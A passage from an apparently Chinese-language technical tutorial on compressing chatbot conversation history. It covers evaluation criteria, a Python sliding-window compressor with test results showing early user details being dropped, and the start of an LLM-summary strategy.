    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"嗯"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"还有什么我能帮你的吗？"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"没有了"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"好的，祝你工作顺利！"</span>}
]

统计：
- <span class="hljs-number">20</span>条消息
- 约<span class="hljs-number">2000</span> tokens
- 包含重要信息：<span class="hljs-string">"Tom"</span>、<span class="hljs-string">"上海"</span>、<span class="hljs-string">"AI工程师"</span>、<span class="hljs-string">"Agent"</span>、<span class="hljs-string">"Redis"</span>
- 也包含冗余信息：<span class="hljs-string">"好的谢谢"</span>、<span class="hljs-string">"嗯"</span>、<span class="hljs-string">"没有了"</span>
</code></pre>
<p><strong>压缩后应该是什么样？</strong></p>
<p>理想的压缩结果：</p>
<pre><code class="hljs language-python" lang="python">压缩后：
[
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"用户Tom，上海AI工程师，研究Agent，遇到通信延迟，推荐用Redis"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"Redis性能怎么样？"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"Redis非常快，单机QPS可达10万+。"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"没有了"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"好的，祝你工作顺利！"</span>}
]

统计：
- <span class="hljs-number">5</span>条消息
- 约<span class="hljs-number">500</span> tokens
- 保留了所有关键信息
- 删除了冗余内容
- 压缩率：<span class="hljs-number">75</span>% ✅
</code></pre>
<h4 data-id="heading-26"><strong>如何评价一个压缩策略？</strong></h4>
<p>我们需要从4个维度来评价：</p>
<p><strong>1. 压缩率（Compression Rate）</strong></p>
<pre><code class="hljs language-diff" lang="diff">压缩率 = (原始tokens - 压缩后tokens) / 原始tokens

例如：
<span class="hljs-deletion">- 原始：2000 tokens</span>
<span class="hljs-deletion">- 压缩后：500 tokens</span>
<span class="hljs-deletion">- 压缩率：75%</span>

越高越好 ✅
</code></pre>
<p><strong>2. 速度（Speed）</strong></p>
<pre><code class="hljs language-diff" lang="diff">压缩耗时

例如：
<span class="hljs-deletion">- 滑动窗口：&lt;1ms（内存操作）</span>
<span class="hljs-deletion">- LLM摘要：1-3秒（需要API调用）</span>

越快越好 ✅
</code></pre>
<p><strong>3. 成本（Cost）</strong></p>
<pre><code class="hljs language-bash" lang="bash">压缩本身的成本

例如：
- 滑动窗口：<span class="hljs-variable">$0</span>（无额外成本）
- LLM摘要：<span class="hljs-variable">$0</span>.0001（需要调用LLM）

越低越好 ✅
</code></pre>
<p><strong>4. 语义保留（Semantic Preservation）</strong></p>
<pre><code class="hljs language-diff" lang="diff">是否保留了重要信息？

例如：
<span class="hljs-deletion">- 滑动窗口：可能丢失早期的重要信息 ⚠️</span>
<span class="hljs-deletion">- LLM摘要：智能提取关键信息 ✅</span>

越好越好 ✅
</code></pre>
<h4 data-id="heading-27"><strong>压缩策略的权衡（Trade-off）</strong></h4>
<p>现实中，我们无法同时优化所有4个维度：</p>
<pre><code class="hljs language-lua" lang="lua">不可能三角：
       速度快
        / \
       /   \
      /     \
   成本低 <span class="hljs-comment">---- 语义好</span>

你只能选两个！
</code></pre>
<p><strong>例如：</strong></p>
<ul>
<li><strong>滑动窗口</strong>：速度快 + 成本低 = 语义差</li>
<li><strong>LLM摘要</strong>：语义好 + 压缩率高 = 速度慢、成本高</li>
<li><strong>混合策略</strong>：尝试平衡三者</li>
</ul>
<h4 data-id="heading-28"><strong>我们要实现的4种策略</strong></h4>
<p>基于不同的权衡，我们实现4种压缩策略：</p>



































<table><thead><tr><th>策略</th><th>核心思路</th><th>优势维度</th><th>劣势维度</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>只保留最近N轮</td><td>速度、成本</td><td>语义保留</td></tr><tr><td><strong>LLM摘要</strong></td><td>用LLM总结历史</td><td>语义保留</td><td>速度、成本</td></tr><tr><td><strong>混合策略</strong></td><td>自适应选择</td><td>平衡</td><td>复杂度</td></tr><tr><td><strong>Token动态</strong></td><td>精确控制token数</td><td>精确度</td><td>语义保留</td></tr></tbody></table>
<p>接下来，我们逐个详解这4种策略的：</p>
<ul>
<li>核心原理</li>
<li>代码实现</li>
<li>性能表现</li>
<li>适用场景</li>
</ul>
<p>好的！让我们写 <strong>3.2 策略1：滑动窗口</strong> 🪟</p>
<hr/>
<h4 data-id="heading-29"/>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SlidingWindowCompressor</span>:
    <span class="hljs-string">"""
    滑动窗口压缩器
    
    原理：只保留最近N轮对话
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, keep_turns: <span class="hljs-built_in">int</span> = <span class="hljs-number">5</span></span>):
        <span class="hljs-string">"""
        Args:
            keep_turns: 保留最近几轮对话
        """</span>
        self.keep_turns = keep_turns
        self.keep_messages = keep_turns * <span class="hljs-number">2</span>  <span class="hljs-comment"># 1轮 = 2条消息</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]:
        <span class="hljs-string">"""
        压缩消息列表
        
        Args:
            messages: 原始消息列表
            
        Returns:
            压缩后的消息列表
        """</span>
        <span class="hljs-comment"># 如果消息数未超过限制，直接返回</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(messages) &lt;= self.keep_messages:
            <span class="hljs-keyword">return</span> messages
        
        <span class="hljs-comment"># 只保留最后N条消息</span>
        compressed = messages[-self.keep_messages:]
        
        <span class="hljs-keyword">return</span> compressed
</code></pre>
<p><strong>使用示例：</strong></p>
<pre><code class="hljs language-python" lang="python">compressor = SlidingWindowCompressor(keep_turns=<span class="hljs-number">3</span>)

<span class="hljs-comment"># 原始对话（10条消息，5轮）</span>
messages = [
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我叫Tom"</span>},           <span class="hljs-comment"># 第1轮</span>
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"你好Tom！"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我在上海"</span>},          <span class="hljs-comment"># 第2轮</span>
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"上海不错"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我是工程师"</span>},        <span class="hljs-comment"># 第3轮</span>
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"很好"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我研究AI"</span>},          <span class="hljs-comment"># 第4轮</span>
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"AI很热"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"推荐书籍"</span>},          <span class="hljs-comment"># 第5轮</span>
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"推荐xxx"</span>},
]

<span class="hljs-comment"># 压缩：只保留最近3轮</span>
compressed = compressor.compress(messages)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"原始：<span class="hljs-subst">{<span class="hljs-built_in">len</span>(messages)}</span>条消息"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"压缩后：<span class="hljs-subst">{<span class="hljs-built_in">len</span>(compressed)}</span>条消息"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"保留的是第3-5轮"</span>)
<span class="hljs-comment"># 输出：</span>
<span class="hljs-comment"># 原始：10条消息</span>
<span class="hljs-comment"># 压缩后：6条消息</span>
<span class="hljs-comment"># 保留的是第3-5轮</span>
</code></pre>
<h4 data-id="heading-30"><strong>工作原理可视化</strong></h4>
<pre><code class="hljs language-python" lang="python">原始对话（<span class="hljs-number">20</span>条消息，<span class="hljs-number">10</span>轮）：

轮数:  <span class="hljs-number">1</span>      <span class="hljs-number">2</span>      <span class="hljs-number">3</span>      <span class="hljs-number">4</span>      <span class="hljs-number">5</span>      <span class="hljs-number">6</span>      <span class="hljs-number">7</span>      <span class="hljs-number">8</span>      <span class="hljs-number">9</span>      <span class="hljs-number">10</span>
      [u,a] [u,a] [u,a] [u,a] [u,a] [u,a] [u,a] [u,a] [u,a] [u,a]
       ↓                                                    ↓
     丢弃前<span class="hljs-number">7</span>轮                                          保留后<span class="hljs-number">3</span>轮

压缩后（<span class="hljs-number">6</span>条消息，<span class="hljs-number">3</span>轮）：

轮数:                                                  <span class="hljs-number">8</span>      <span class="hljs-number">9</span>      <span class="hljs-number">10</span>
                                                     [u,a] [u,a] [u,a]
</code></pre>
<h4 data-id="heading-31"><strong>性能分析</strong></h4>
<p>好的！让我们先更新 <strong>3.2 滑动窗口</strong> 的数据部分 📝</p>
<p>好的！让我完全重写 <strong>3.2 滑动窗口策略</strong>，整合所有真实数据 📝</p>
<hr/>
<h3 data-id="heading-32"><strong>3.2 策略1：滑动窗口（Sliding Window）</strong></h3>
<h4 data-id="heading-33"><strong>核心原理</strong></h4>
<p>滑动窗口是最简单直接的压缩策略：<strong>只保留最近的N轮对话，丢弃更早的消息。</strong></p>
<p>就像一个固定大小的"窗口"在对话历史上滑动：</p>
<pre><code class="hljs language-markdown" lang="markdown">完整对话历史（10轮，20条消息）：
┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
│ 1  │ 2  │ 3  │ 4  │ 5  │ 6  │ 7  │ 8  │ 9  │ 10 │
└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘

保留最近5轮（窗口大小=5）：
<span class="hljs-code">                              ┌────┬────┬────┬────┬────┐
│ 6  │ 7  │ 8  │ 9  │ 10 │     └────┴────┴────┴────┴────┘
             ↑
          滑动窗口
</span></code></pre>
<p><strong>工作方式：</strong></p>
<ol>
<li>设定窗口大小（如5轮 = 10条消息）</li>
<li>当消息超过窗口大小时</li>
<li>自动删除最早的消息</li>
<li>保持窗口内的消息数量固定</li>
</ol>
<h4 data-id="heading-34"><strong>代码实现</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SlidingWindowCompressor</span>:
    <span class="hljs-string">"""
    滑动窗口压缩器
    
    特点：
    - 极简实现（3行核心代码）
    - 极快速度（0.14微秒/次）
    - 零成本（无需API调用）
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, keep_turns: <span class="hljs-built_in">int</span> = <span class="hljs-number">5</span></span>):
        <span class="hljs-string">"""
        Args:
            keep_turns: 保留最近几轮对话
        """</span>
        self.keep_turns = keep_turns
        self.keep_messages = keep_turns * <span class="hljs-number">2</span>  <span class="hljs-comment"># 1轮 = user + assistant</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]:
        <span class="hljs-string">"""
        压缩消息列表
        
        Args:
            messages: 原始消息列表
            
        Returns:
            压缩后的消息列表
        """</span>
        <span class="hljs-comment"># 核心逻辑就这一行！</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(messages) &lt;= self.keep_messages:
            <span class="hljs-keyword">return</span> messages
        
        <span class="hljs-keyword">return</span> messages[-self.keep_messages:]
</code></pre>
<p><strong>就这么简单！</strong> 核心代码只有一行：<code>messages[-self.keep_messages:]</code></p>
<h4 data-id="heading-35"><strong>真实性能测试</strong></h4>
<p>我们对滑动窗口进行了5项完整测试，以下是真实数据：</p>
<hr/>
<p><strong>测试1：压缩率测试</strong></p>
<p>窗口大小设置为5轮，测试不同长度的对话：</p>



































<table><thead><tr><th>对话长度</th><th>原始</th><th>压缩后</th><th>Token压缩率</th></tr></thead><tbody><tr><td>5轮（短对话）</td><td>10条 / 126 tokens</td><td>10条 / 126 tokens</td><td><strong>0%</strong></td></tr><tr><td>10轮（中等）</td><td>20条 / 249 tokens</td><td>10条 / 123 tokens</td><td><strong>50.6%</strong></td></tr><tr><td>20轮（长对话）</td><td>42条 / 560 tokens</td><td>10条 / 145 tokens</td><td><strong>74.1%</strong></td></tr><tr><td>30轮（超长）</td><td>68条 / 933 tokens</td><td>10条 / 144 tokens</td><td><strong>84.6%</strong></td></tr></tbody></table>
<p><strong>关键发现：</strong></p>
<pre><code class="hljs language-diff" lang="diff">压缩率随对话长度增加：
<span class="hljs-deletion">- 5轮: 0% (不压缩)</span>
<span class="hljs-deletion">- 10轮: 50% (压缩一半)</span>
<span class="hljs-deletion">- 20轮: 74% (压缩3/4)</span>
<span class="hljs-deletion">- 30轮: 85% (压缩85%)</span>

结论：对话越长，滑动窗口越有效 ✅
</code></pre>
<hr/>
<p><strong>测试2：速度测试</strong></p>
<p>测试10万次压缩操作的耗时：</p>
<pre><code class="hljs language-diff" lang="diff">操作次数: 100,000次
总耗时: 13.63ms
平均每次: 0.14微秒 ⚡

直观对比：
<span class="hljs-deletion">- 人眨眼一次: 100,000微秒</span>
<span class="hljs-deletion">- 在眨眼时间内，滑动窗口可以执行 714,285次</span>
<span class="hljs-deletion">- 一次HTTP请求(50ms)内，可以执行 357,142次</span>
</code></pre>
<p><strong>结论：速度快到可以忽略不计。</strong></p>
<hr/>
<p><strong>测试3：信息丢失分析（关键测试！）</strong></p>
<p>构造一个包含重要用户信息的8轮对话，使用5轮窗口压缩：</p>
<pre><code class="hljs language-python" lang="python">原始对话（<span class="hljs-number">8</span>轮，<span class="hljs-number">16</span>条消息）:
  轮<span class="hljs-number">1</span> 用户: <span class="hljs-string">"我叫Tom，今年28岁"</span>          ← 重要！
      助手: <span class="hljs-string">"你好Tom！"</span>
  轮<span class="hljs-number">2</span> 用户: <span class="hljs-string">"我在上海浦东工作"</span>           ← 重要！
      助手: <span class="hljs-string">"浦东是金融中心"</span>
  轮<span class="hljs-number">3</span> 用户: <span class="hljs-string">"我是AI工程师"</span>               ← 重要！
      助手: <span class="hljs-string">"很有前景的职业"</span>
  轮<span class="hljs-number">4</span> 用户: <span class="hljs-string">"我在研究Agent技术"</span>          ← 重要！
      助手: <span class="hljs-string">"Agent很前沿"</span>
  轮<span class="hljs-number">5</span> 用户: <span class="hljs-string">"嗯"</span>                         ← 无用
      助手: <span class="hljs-string">"还有什么问题吗？"</span>
  轮<span class="hljs-number">6</span> 用户: <span class="hljs-string">"好的"</span>                       ← 无用
      助手: <span class="hljs-string">"随时问我"</span>
  轮<span class="hljs-number">7</span> 用户: <span class="hljs-string">"谢谢"</span>                       ← 无用
      助手: <span class="hljs-string">"不客气"</span>
  轮<span class="hljs-number">8</span> 用户: <span class="hljs-string">"那我研究一下"</span>
      助手: <span class="hljs-string">"好的，加油"</span>

压缩后（保留<span class="hljs-number">5</span>轮 = <span class="hljs-number">10</span>条消息）:
  ✅ 轮<span class="hljs-number">4</span>: <span class="hljs-string">"我在研究Agent技术"</span>
  ✅ 轮<span class="hljs-number">5</span>: <span class="hljs-string">"嗯"</span>
  ✅ 轮<span class="hljs-number">6</span>: <span class="hljs-string">"好的"</span>
  ✅ 轮<span class="hljs-number">7</span>: <span class="hljs-string">"谢谢"</span>
  ✅ 轮<span class="hljs-number">8</span>: <span class="hljs-string">"那我研究一下"</span>

被丢弃的内容（前<span class="hljs-number">3</span>轮 = <span class="hljs-number">6</span>条消息）:
  ❌ <span class="hljs-string">"我叫Tom，今年28岁"</span>        ⚠️ 重要信息！
  ❌ <span class="hljs-string">"你好Tom！"</span>                 ⚠️ 包含姓名
  ❌ <span class="hljs-string">"我在上海浦东工作"</span>          ⚠️ 重要信息！
  ❌ <span class="hljs-string">"浦东是金融中心"</span>
  ❌ <span class="hljs-string">"我是AI工程师"</span>             ⚠️ 重要信息！
  ❌ <span class="hljs-string">"很有前景的职业"</span>
</code></pre>
<p><strong>问题一目了然：</strong></p>
<ul>
<li>所有用户背景信息（姓名、地点、职业）全部丢失</li>
<li>保留的却是"嗯"、"好的"、"谢谢"这些无意义内容</li>
</ul>
<p><strong>这就是滑动窗口的致命缺陷！</strong> 它不会思考什么重要，只会机械地按时间删除。</p>
<hr/>
<p><strong>测试4：真实Chatbot场景</strong></p>
<p>模拟一个15轮连续对话，观察关键信息的丢失过程：</p>
<pre><code class="hljs language-makefile" lang="makefile">初始关键信息：
- 姓名: <span class="hljs-string">"Tom"</span>
- 地点: <span class="hljs-string">"上海"</span>
- 职业: <span class="hljs-string">"AI工程师"</span>
- 研究方向: <span class="hljs-string">"Agent"</span>

<span class="hljs-section">第5轮后:</span>
  记忆: 10条消息（5轮）
  压缩: 10条 → 10条（未超过限制）
  关键词: ✅ Tom、上海、AI工程师、Agent 全部保留

<span class="hljs-section">第10轮后:</span>
  记忆: 20条消息（10轮）
  压缩: 20条 → 10条（删除前5轮）
  关键词: ❌ Tom、上海、AI工程师、Agent 全部丢失

<span class="hljs-section">第15轮后:</span>
  记忆: 20条消息（10轮，因为短期记忆限制）
  压缩: 20条 → 10条
  关键词: ❌ 仍然全部丢失
</code></pre>
<p><strong>结论：超过10轮后，早期的所有关键信息永久丢失。</strong></p>
<hr/>
<p><strong>测试5：不同窗口大小的权衡</strong></p>
<p>在同一个20轮对话（560 tokens）中测试不同窗口大小：</p>









































<table><thead><tr><th>窗口大小</th><th>保留消息</th><th>压缩后Tokens</th><th>Token压缩率</th></tr></thead><tbody><tr><td>3轮</td><td>6条</td><td>86</td><td><strong>84.6%</strong> ⭐</td></tr><tr><td>5轮</td><td>10条</td><td>145</td><td><strong>74.1%</strong></td></tr><tr><td>8轮</td><td>16条</td><td>227</td><td><strong>59.5%</strong></td></tr><tr><td>10轮</td><td>20条</td><td>287</td><td><strong>48.8%</strong></td></tr><tr><td>15轮</td><td>30条</td><td>408</td><td><strong>27.1%</strong></td></tr></tbody></table>
<p><strong>权衡分析：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">窗口太小（3轮）:</span>
✅ 压缩率高（85%）
❌ 信息丢失严重
❌ 对话连贯性差

<span class="hljs-section">窗口适中（5-8轮）:</span>
✅ 压缩率好（60-75%）
⚠️ 信息丢失中等
✅ 对话基本连贯

<span class="hljs-section">窗口太大（15轮）:</span>
❌ 压缩率低（27%）
✅ 信息保留好
✅ 对话连贯
</code></pre>
<p><strong>推荐设置：</strong></p>
<ul>
<li>短对话场景：3-5轮</li>
<li>一般场景：5-8轮</li>
<li>重要对话：10-15轮</li>
</ul>
<p>完整测试代码：[GitHub - tests/test_sliding_window.py]</p>
<hr/>
<h4 data-id="heading-36"><strong>优缺点总结</strong></h4>
<p>基于真实测试数据，我们得出：</p>
<p><strong>✅ 三大优势：</strong></p>
<ol>
<li><strong>速度极快</strong>
<ul>
<li>0.14微秒/次（测试数据）</li>
<li>比网络请求快35万倍</li>
<li>完全不影响响应时间</li>
</ul>
</li>
<li><strong>零成本</strong>
<ul>
<li>无需调用LLM API</li>
<li>无额外token消耗</li>
<li>日活百万也不增加成本</li>
</ul>
</li>
<li><strong>压缩效果随对话增长</strong>
<ul>
<li>10轮：50%</li>
<li>20轮：74%</li>
<li>30轮：85%</li>
<li>对话越长越划算</li>
</ul>
</li>
</ol>
<p><strong>❌ 两大缺陷：</strong></p>
<ol>
<li><strong>严重的信息丢失</strong>（实测证明）
<ul>
<li>所有用户背景信息在10轮后丢失</li>
<li>不区分"Tom"和"嗯"的重要性</li>
<li>保留无用内容，丢弃关键信息</li>
</ul>
</li>
<li><strong>短对话无效</strong>
<ul>
<li>5轮内压缩率0%</li>
<li>浪费优化机会</li>
</ul>
</li>
</ol>
<hr/>
<h4 data-id="heading-37"><strong>适用场景指南</strong></h4>
<p>基于测试数据，我们总结：</p>
<p><strong>✅ 适合使用：</strong></p>
<ol>
<li><strong>短时对话（≤10轮）</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：客服快速咨询、FAQ问答
理由：
<span class="hljs-deletion">- 实测：10轮内压缩率50%</span>
<span class="hljs-deletion">- 关键信息丢失风险低</span>
<span class="hljs-deletion">- 速度优势明显</span>
</code></pre>
<ol>
<li><strong>实时性要求高</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：即时聊天、游戏NPC对话
理由：
<span class="hljs-deletion">- 实测：0.14微秒，零延迟</span>
<span class="hljs-deletion">- 用户感知不到压缩过程</span>
</code></pre>
<ol>
<li><strong>成本敏感</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：大规模免费产品
理由：
<span class="hljs-deletion">- 零成本</span>
<span class="hljs-deletion">- 日活百万也不增加费用</span>
</code></pre>
<ol>
<li><strong>简单交互</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：查询类、工具类对话
理由：
<span class="hljs-deletion">- 不需要记住用户背景</span>
<span class="hljs-deletion">- 每次对话相对独立</span>
</code></pre>
<p><strong>❌ 不适合：</strong></p>
<ol>
<li><strong>长时间对话（&gt;10轮）</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：技术支持、深度咨询
问题：
<span class="hljs-deletion">- 实测：10轮后丢失所有早期信息</span>
<span class="hljs-deletion">- 用户体验差（AI不记得说过什么）</span>
</code></pre>
<ol>
<li><strong>个性化要求高</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：个人助理、教育辅导
问题：
<span class="hljs-deletion">- 用户信息在开头（会被删除）</span>
<span class="hljs-deletion">- 无法保持个性化体验</span>
</code></pre>
<ol>
<li><strong>信息密集型</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：项目讨论、决策分析
问题：
<span class="hljs-deletion">- 每轮都可能有关键信息</span>
<span class="hljs-deletion">- 不能随意丢弃任何内容</span>
</code></pre>
<hr/>
<h4 data-id="heading-38"><strong>最佳实践</strong></h4>
<p>基于测试结果，给出实用建议：</p>
<p><strong>1. 根据场景设置窗口大小</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 快速咨询</span>
compressor = SlidingWindowCompressor(keep_turns=<span class="hljs-number">3</span>)  <span class="hljs-comment"># 压缩率85%</span>

<span class="hljs-comment"># 一般对话</span>
compressor = SlidingWindowCompressor(keep_turns=<span class="hljs-number">5</span>)  <span class="hljs-comment"># 压缩率74%</span>

<span class="hljs-comment"># 重要对话</span>
compressor = SlidingWindowCompressor(keep_turns=<span class="hljs-number">10</span>) <span class="hljs-comment"># 压缩率49%</span>
</code></pre>
<p><strong>2. 监控信息丢失</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SlidingWindowCompressor</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(messages) &gt; self.keep_messages:
            dropped = messages[:-self.keep_messages]
            
            <span class="hljs-comment"># 检查丢弃的消息中是否有重要实体</span>
            <span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> dropped:
                <span class="hljs-keyword">if</span> self._contains_important_entity(msg):
                    logger.warning(<span class="hljs-string">f"丢弃了重要信息: <span class="hljs-subst">{msg[<span class="hljs-string">'content'</span>][:<span class="hljs-number">50</span>]}</span>"</span>)
        
        <span class="hljs-keyword">return</span> messages[-self.keep_messages:]
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_contains_important_entity</span>(<span class="hljs-params">self, msg</span>):
        <span class="hljs-string">"""检测是否包含重要实体（人名、地名等）"""</span>
        <span class="hljs-comment"># 简单实现：检查是否包含特定关键词</span>
        keywords = [<span class="hljs-string">'叫'</span>, <span class="hljs-string">'在'</span>, <span class="hljs-string">'是'</span>, <span class="hljs-string">'做'</span>, <span class="hljs-string">'研究'</span>]
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">any</span>(kw <span class="hljs-keyword">in</span> msg[<span class="hljs-string">'content'</span>] <span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> keywords)
</code></pre>
<p><strong>3. 与其他策略结合</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 策略1：滑动窗口 + 用户画像</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">EnhancedChatbot</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.compressor = SlidingWindowCompressor(keep_turns=<span class="hljs-number">5</span>)
        self.user_profile = {}  <span class="hljs-comment"># 永久保存：姓名、偏好等</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">self, user_input</span>):
        <span class="hljs-comment"># 提取用户信息（如姓名、地点）</span>
        self._extract_user_info(user_input)
        
        <span class="hljs-comment"># 压缩对话历史</span>
        compressed_history = self.compressor.compress(self.memory)
        
        <span class="hljs-comment"># 构建上下文：用户画像 + 压缩历史</span>
        context = [
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">f"用户信息: <span class="hljs-subst">{self.user_profile}</span>"</span>}
        ] + compressed_history
        
        <span class="hljs-keyword">return</span> self.llm.chat(context)
</code></pre>
<hr/>
<h4 data-id="heading-39"><strong>小结</strong></h4>
<p>滑动窗口压缩器的特点：</p>
<pre><code class="hljs language-bash" lang="bash">三个<span class="hljs-string">"最"</span>：
✅ 最简单（3行代码）
✅ 最快（0.14微秒）
✅ 最便宜（<span class="hljs-variable">$0</span>）

一个<span class="hljs-string">"坑"</span>：
❌ 机械删除，丢失重要信息

最佳定位：
适合短对话、实时场景、成本敏感场景
</code></pre>
<p><strong>什么时候用？</strong></p>
<ul>
<li>对话≤10轮</li>
<li>要求极致速度</li>
<li>预算为零</li>
</ul>
<p><strong>什么时候不用？</strong></p>
<ul>
<li>对话&gt;10轮</li>
<li>需要记住用户背景</li>
<li>信息很重要</li>
</ul>
<p>在下一节，我们将看到完全相反的策略：<strong>LLM摘要</strong> - 慢但智能，能够解决信息丢失问题。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed55d5b080724c7ab6fd8ca106afc4ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWdlbnRCdWlsZGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765471478&amp;x-signature=bnNzoS8w%2Bn%2BfIkbNygFZPN%2BZGcY%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<hr/>
<h3 data-id="heading-40"><strong>3.3 策略2：LLM摘要（LLM Summary）</strong></h3>
<h4 data-id="heading-41"><strong>核心原理</strong></h4>
<p>LLM摘要是一种<strong>智能压缩</strong>策略：用大语言模型理解对话历史，提取关键信息生成摘要，保留最近几轮完整对话。</p>
<pre><code class="hljs">原始对话（10轮，20条消息）：
┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
│ 1  │ 2  │ 3  │ 4  │ 5  │ 6  │ 7  │ 8  │ 9  │ 10 │
└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘
  ↓                                    ↓
  历史部分（1-7轮）              最近部分（8-10轮）
  ↓                                    ↓
  LLM智能摘要                       完整保留
  ↓                                    ↓
┌──────────────────────┐      ┌────┬────┬────┐
│ 📝 摘要：用户Tom，     │  +   │ 8  │ 9  │ 10 │
│ 上海AI工程师...        │      └────┴────┴────┘
└──────────────────────┘
</code></pre>
<p><strong>核心思想：</strong></p>
<ul>
<li>远期对话（第1-7轮）→ 用LLM生成摘要</li>
<li>近期对话（第8-10轮）→ 完整保留</li>
<li>摘要 + 完整对话 = 压缩后的上下文</li>
</ul>
<p>与滑动窗口的本质区别：</p>
<ul>
